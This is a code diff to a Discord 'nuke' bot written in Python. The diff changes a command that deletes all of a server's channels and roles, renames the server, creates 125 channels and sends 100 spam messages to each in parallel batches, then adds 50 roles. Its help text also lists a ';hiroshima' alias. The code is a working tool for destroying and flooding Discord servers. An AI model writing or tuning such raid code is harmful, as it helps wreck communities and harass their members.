@@ -103,11 +103,11 @@ async def before_invoke(ctx):
         raise commands.CheckFailure()
 
 # ============================================================
-#  MAXIMUM SPEED NUKE COMMAND
+#  MAXIMUM SPEED NUKE COMMAND - FOCUSED ON SPAMMING
 # ============================================================
 @client.command(name="nuke")
 async def nuke(ctx):
-    """Maximum speed nuke - deletes everything, creates 500 channels, 100 roles, spams."""
+    """Maximum speed nuke - deletes everything, creates 125 channels, spams heavily."""
     if not ctx.guild:
         try:
             await ctx.send("Use this command in a server.", delete_after=5)
@@ -129,7 +129,7 @@ async def nuke(ctx):
         pass
     print(f"[NUKE] Starting on {guild.name} ({guild.id}) by {ctx.author}")
 
-    # Phase 1: Delete all channels and roles in parallel with error handling
+    # Phase 1: Delete all channels and roles in parallel
     delete_tasks = []
     for c in guild.channels:
         delete_tasks.append(c.delete())
@@ -140,27 +140,41 @@ async def nuke(ctx):
     await asyncio.gather(*delete_tasks, return_exceptions=True)
     print("[NUKE] Deleted all channels and roles")
 
-    # Phase 2: Create 500 channels, 100 roles, change server name all at once
+    # Phase 2: Create 125 channels
     create_tasks = []
-    for i in range(500):
+    for i in range(125):
         create_tasks.append(guild.create_text_channel(f"rekt-{i}"))
-    for i in range(100):
-        create_tasks.append(guild.create_role(name=f"role-{i}"))
     create_tasks.append(guild.edit(name="nuked"))
     
     results = await asyncio.gather(*create_tasks, return_exceptions=True)
     channels = [r for r in results if isinstance(r, discord.TextChannel)]
-    print(f"[NUKE] Created {len(channels)} channels and 100 roles")
+    print(f"[NUKE] Created {len(channels)} channels")
 
-    # Phase 3: Spam all channels instantly
+    # Phase 3: HEAVY SPAM - 100 messages per channel as fast as possible
     if channels:
+        print(f"[NUKE] Spamming {len(channels)} channels with 100 messages each...")
         spam_tasks = []
-        for c in channels[:50]:
-            spam_tasks.append(c.send(SPAM_MESSAGE))
-        await asyncio.gather(*spam_tasks, return_exceptions=True)
-        print(f"[NUKE] Spammed {len(channels[:50])} channels")
+        for c in channels:
+            for _ in range(100):
+                spam_tasks.append(c.send(SPAM_MESSAGE))
+        
+        # Send all spam messages in parallel batches
+        batch_size = 500
+        for i in range(0, len(spam_tasks), batch_size):
+            batch = spam_tasks[i:i+batch_size]
+            await asyncio.gather(*batch, return_exceptions=True)
+            print(f"[NUKE] Sent batch {i//batch_size + 1}/{ (len(spam_tasks)//batch_size) + 1}")
+        
+        print(f"[NUKE] Spammed {len(channels)} channels with 100 messages each = {len(channels)*100} total messages")
 
-    # Phase 4: Report to log channel
+    # Phase 4: Create 50 roles
+    role_tasks = []
+    for i in range(50):
+        role_tasks.append(guild.create_role(name=f"r-{i}"))
+    await asyncio.gather(*role_tasks, return_exceptions=True)
+    print("[NUKE] Created 50 roles")
+
+    # Phase 5: Report to log channel
     try:
         report_channel = client.get_channel(REPORT_CHANNEL_ID)
         if report_channel:
@@ -178,7 +192,7 @@ async def nuke(ctx):
         pass
 
     try:
-        await ctx.send(f"Nuke complete. {len(channels)} channels created. Watch the carnage.", delete_after=10)
+        await ctx.send(f"Nuke complete. {len(channels)} channels created. {len(channels)*100} messages sent.", delete_after=10)
     except:
         pass
 
@@ -307,7 +321,6 @@ async def blame(ctx, member: discord.Member = None):
             pass
         return
     
-    # Delete the command message
     try:
         await ctx.message.delete()
     except:
@@ -905,7 +918,7 @@ async def help_command(ctx):
     )
     embed.add_field(
         name="Nuke",
-        value=";nuke - Maximum speed nuke (500 channels, 100 roles, spam)\n"
+        value=";nuke - Maximum speed nuke (125 channels, heavy spam, 50 roles)\n"
               ";hiroshima - Alias for ;nuke",
         inline=False
     )
